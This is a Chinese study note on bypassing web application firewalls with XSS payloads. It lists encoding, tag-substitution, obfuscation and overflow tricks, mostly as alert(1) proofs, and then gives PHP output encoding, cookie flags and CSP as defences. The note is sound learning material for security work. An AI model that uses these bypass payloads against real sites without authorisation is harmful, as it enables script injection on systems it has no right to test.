# 2026-08-04 XSS WAF 绕过体系 + 安全修复方案

> 前置笔记：[XSS 入门认知框架](./2026-08-02-XSS跨站脚本攻击入门.md) | [XSS 平台工具与 HttpOnly 绕过](./2026-08-03-XSS平台工具与HttpOnly绕过.md)

## 一、WAF 绕过总思路

### 1.1 WAF 怎么拦截 XSS

```
你的输入 → WAF 正则/特征库匹配 → 发现危险模式 → 拦截（403/重定向）
               │
               ├── 匹配关键词：<script>、alert、onerror、javascript: 等
               ├── 匹配标签语法：<...> 尖括号组合
               └── 匹配编码后的恶意模式
```

### 1.2 绕过核心：让 WAF 和后端/浏览器看到不一样的东西

```
WAF 看到：无害字符串 → 放行 ✅
浏览器/后端解析后：恶意 JS → 执行 💥
```

---

## 二、绕过手法（按类别）

### 2.1 标签/事件替换

WAF 通常封了 `<script>` 标签，但 HTML 里有几百个事件可以触发 JS。

| 方法 | Payload | 说明 |
|------|---------|------|
| `<img>` + onerror | `<img src=x onerror=alert(1)>` | ⭐ 最常用，图片加载失败自动触发 |
| `<svg>` + onload | `<svg onload=alert(1)>` | svg 加载完成自动触发 |
| `<body>` + onload | `<body onload=alert(1)>` | 页面加载完成触发 |
| `<input>` + onfocus | `<input onfocus=alert(1) autofocus>` | 自动获得焦点触发 |
| `<details>` + ontoggle | `<details open ontoggle=alert(1)>` | 展开/折叠触发 |
| `<video>` + onerror | `<video src=x onerror=alert(1)>` | 同 img 思路 |
| `<marquee>` + onstart | `<marquee onstart=alert(1)>` | 滚动开始触发 |
| `<select>` + onfocus | `<select onfocus=alert(1) autofocus>` | 同 input 思路 |

**一句话**：`<script>` 只是触发 JS 的一种方式，浏览器里能触发 JS 的方式有上百种。

### 2.2 大小写混淆

WAF 正则区分大小写时有效：

```html
<ScRiPt>alert(1)</sCrIpT>
<ImG sRc=x OnErRoR=alert(1)>
```

> ⚠️ 大多数现代 WAF 默认不区分大小写（`/i` 标志），所以这个方法在实战中命中率有限。但碰到自行用 `strpos()` / `strstr()` 做过滤的代码时仍然有效。

### 2.3 双写绕过

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
oonnerrorror=alert(1)
```

PHP 的 `preg_replace` 只替换一次 → 替换后两边字符拼起来恢复原样。

> ⚠️ 同样，有 `preg_replace` 做过滤的代码才有效，WAF 很少犯这个错误。

### 2.4 编码绕过

这是绕过 WAF 的最核心手段。

| 编码方式 | 示例 | 适用场景 |
|----------|------|----------|
| **HTML 实体（十进制）** | `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)` | `<a href>` 属性内 |
| **HTML 实体（十六进制）** | `&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)` | 同上 |
| **URL 编码** | `%3Cscript%3Ealert(1)%3C/script%3E` | URL 参数中，后端不自动解码时 |
| **双重 URL 编码** | `%253Cscript%253E`（`%25` → `%`） | WAF 只解码一次，后端解码两次 |
| **Unicode 编码** | `alert(1)` | JS 字符串内 |
| **Base64** | `<script>eval(atob('YWxlcnQoMSk='))</script>` | `eval` 未被封时 |
| **JSFuck** | `[][(![]+[])...]()` | 只用 6 个字符表示任意 JS（极度混淆） |

**为什么 HTML 实体编码能绕 WAF**：
```
WAF 看：&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
        → 没有 "javascript" 这个字符串 → 放行 ✅

浏览器看：<a href="&#106;...;"> → 先解码实体 → javascript:alert(1) → 执行 ✅
```

### 2.5 空格/分隔符替代

WAF 可能对空格敏感，换一种方式隔开关键字：

| 替代符 | 写法 | 说明 |
|--------|------|------|
| `/` | `<img/src=x/onerror=alert(1)>` | 部分场景替代空格 |
| `%0a`（换行） | `<img%0asrc=x%0aonerror=alert(1)>` | URL 编码的换行 |
| `%0d`（回车） | `<img%0dsrc=x%0donerror=alert(1)>` | URL 编码的回车 |
| `%09`（Tab） | `<img%09src=x%09onerror=alert(1)>` | URL 编码的 Tab |
| `/**/` | `<img/**/src=x/**/onerror=alert(1)>` | 如果注释未被过滤 |
| `%00`（空字节） | `<script%00>alert(1)</script>` | 部分 WAF 在 `%00` 处截断检测 |
| `` ` ``（反引号） | `` <img src=x onerror=alert`1`> `` | 替代括号 |

### 2.6 括号绕过

WAF 封括号时：

```html
<!-- 反引号替代括号 -->
<img src=x onerror=alert`1`>

<!-- 无括号触发 -->
<script>onerror=alert;throw 1</script>

<!-- 编码括号 -->
<img src=x onerror=alert&#40;1&#41;>

<!-- 利用 location -->
<img src=x onerror="location='javascript:alert%281%29'">
```

### 2.7 关键词拆分/混淆

```html
<!-- 字符串拼接 -->
<img src=x onerror="eval('al'+'ert(1)')">
<img src=x onerror="window['al'+'ert'](1)">

<!-- String.fromCharCode -->
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">

<!-- Base64 -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- unescape -->
<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>

<!-- 利用正则 -->
<script>alert(/xss/.source)</script>
```

### 2.8 利用 `<a>` 标签伪协议

```html
<!-- ❌ <script> 被拦截时 -->
<a href="javascript:alert(1)">点我</a>

<!-- 编码绕过 javascript 关键字过滤 -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">点我</a>

<!-- 利用 data: 协议 -->
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">点我</a>
```

### 2.9 利用 CSS 注入

```html
<!-- CSS expression（仅 IE 老版本） -->
<div style="background:url(javascript:alert(1))">

<!-- CSS @import -->
<style>@import url('javascript:alert(1)');</style>
```

### 2.10 数据溢出

WAF 有检测长度上限，超长内容直接放行：

```html
AAAAAA...[重复几千个 A]...<script>alert(1)</script>
```

WAF 读到缓冲区上限就停了，没看到后面的 `<script>`。

### 2.11 Content-Type 欺骗

```http
Content-Type: application/json  ← WAF 认为这是 JSON，不做 XSS 检测

{"data": "<script>alert(1)</script>"}
```

部分 WAF 遇到 `application/json` / `text/plain` 会跳过检测，但浏览器可能仍然渲染为 HTML。

### 2.12 绕过总结速查表

| 类别 | 核心思路 | 最常用 Payload |
|------|----------|---------------|
| **标签替换** | `<script>` 封了就用 `<img onerror>` | `<img src=x onerror=alert(1)>` |
| **大小写** | 正则没 `i` 就混合大小写 | `<ScRiPt>alert(1)</sCrIpT>` |
| **双写** | `preg_replace` 只替换一次 | `<scr<script>ipt>` |
| **HTML 实体编码** | 浏览器会自动解码 | `&#106;&#97;&#118;&#97;...` |
| **字符串拼接** | 拆开关键词 | `eval('al'+'ert(1)')` |
| **Base64** | 编码整段代码 | `eval(atob('YWxlcnQoMSk='))` |
| **伪协议** | `<a href>` 用 `javascript:` | `<a href="javascript:alert(1)">` |
| **数据溢出** | 超长字符串撑爆 WAF 缓冲区 | 4000 字符 + Payload |
| **http 参数污染** | 多投 Payload，waf 检测不足 | `id=1&id=<script>alert(1)</script>`|


---

## 三、安全修复方案

### 3.1 输入校验（第一道防线）

```php
// ✅ 白名单 — 只接受你预期的数据格式
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die('非法输入');
}

// ✅ 数字用 filter_var
$age = filter_var($_GET['age'], FILTER_VALIDATE_INT);

// ❌ 黑名单 — 永远能被绕过
$input = str_replace('<script>', '', $_GET['q']);
$input = preg_replace('/alert/i', '', $input);
```

### 3.2 输出编码（核心防线）

**根据输出位置选正确的编码函数：**

| 输出位置 | PHP 做法 | 说明 |
|----------|----------|------|
| HTML 内容 `<p><?= ?></p>` | `htmlspecialchars($str, ENT_QUOTES, 'UTF-8')` | `<>'"&` 全转义 |
| HTML 属性 `<input value="<?= ?>">` | 同上 + 属性**必须加引号** | 不加引号就能逃逸 |
| JavaScript `var x = '<?= ?>'` | `json_encode($str)` | 自动转义引号 |
| URL 参数 `<a href="?q=<?= ?>">` | `urlencode($str)` | 编码特殊字符 |
| CSS 中 | **不要**让用户输入进入 CSS | 没法安全地转义 |
| `<a href="<?= ?>">` | 校验协议：只允许 `http:` / `https:` / `mailto:` | 拒绝 `javascript:` |

**PHP 标准写法**：

```php
// ✅ HTML 内容输出
echo '<p>' . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . '</p>';
// <script> → &lt;script&gt; → 浏览器显示纯文本，不执行

// ✅ JS 中输出
echo '<script>var name = ' . json_encode($name) . ';</script>';
// 引号被自动转义，无法突破字符串边界
```

### 3.3 Cookie 安全

```http
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
```

| 属性 | 作用 | 防什么 |
|------|------|--------|
| `HttpOnly` | Cookie 对 JS 不可见 | `document.cookie` 偷不到 |
| `Secure` | 仅 HTTPS 传输 | 网络抓包拿不到 |
| `SameSite=Strict` | 跨站请求不带 Cookie | CSRF 攻击 |

### 3.4 CSP（Content-Security-Policy）

浏览器层面的脚本白名单——即使 XSS 注入成功，浏览器拒绝执行。

```nginx
# 基础配置：只允许本站脚本
Content-Security-Policy: script-src 'self'

# 生产环境示例
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline' https://trusted-cdn.com
```

```html
<!-- 也可以在 HTML 里设置 -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

| CSP 策略 | 效果 |
|----------|------|
| `script-src 'self'` | 禁止所有内联脚本（`<script>alert(1)</script>` 被浏览器拒绝） |
| `script-src 'self' 'nonce-abc123'` | 只允许带 `nonce="abc123"` 的内联脚本 |
| `object-src 'none'` | 禁止 `<object>` `<embed>`（防 Flash 攻击） |
| `base-uri 'self'` | 禁止 `<base>` 标签篡改相对路径 |

### 3.5 X-XSS-Protection（已废弃，仅供参考）

```nginx
X-XSS-Protection: 1; mode=block
```

Chrome 已移除，Edge/Safari 部分支持。**不要依赖它，用 CSP 替代。**

### 3.6 防御分层总结

```
第 1 层：输入校验 — 白名单，拒绝不符合预期的数据
    ↓ 被绕过
第 2 层：输出编码 — htmlspecialchars / json_encode（★ 核心防线）
    ↓ 被绕过
第 3 层：HttpOnly + Secure + SameSite Cookie
    ↓ 被绕过
第 4 层：CSP（Content-Security-Policy）— 浏览器层拒绝执行非法脚本
    ↓ 被绕过
第 5 层：Web 应用隔离 — 用 iframe sandbox 隔离不可信内容
```

**没有完美的防御，但多层重叠能极大地降低攻击成功率。**

---

## 四、总结

### 核心认知

1. **绕过就是"双系统认知差"**：WAF 和后端对同一段数据的解析不同，就有了绕过空间
2. **标签不止 `<script>`**：`<img onerror>` `<svg onload>` `<details ontoggle>`... 上百种触发方式
3. **编码是绕过的万能钥匙**：HTML 实体、URL 编码、Base64、Unicode... 换一种写法，WAF 就不认识
4. **防御核心永远是输出编码**：`htmlspecialchars()` 把 `<` 变成 `&lt;`，浏览器就不会执行

### 关联笔记

- [XSS 入门认知框架](./2026-08-02-XSS跨站脚本攻击入门.md) — 原理/三种类型/防御
- [XSS 平台工具与 HttpOnly 绕过](./2026-08-03-XSS平台工具与HttpOnly绕过.md) — BeEF/XSS Hunter/工具
- [文件上传 WAF 绕过与防御](./2026-08-02-文件上传WAF绕过与防御.md) — 绕过思路同源
- [SQL 注入 WAF 绕过技术体系](./2026-07-30-SQL注入WAF绕过技术与实战.md) — 对照学习

### 待实践

- [ ] 在本地 Linux 服务器上部署 ModSecurity + OWASP CRS，测试绕过
- [ ] 安装宝塔 WAF / 安全狗，逐个测试本文的绕过手法哪些有效
- [ ] 学习 CSP 绕过技术（nonce 泄露、JSONP 劫持等）

> ⚠️ 声明：以上技术仅用于授权靶场和渗透测试授权目标，未经授权使用属于违法行为。
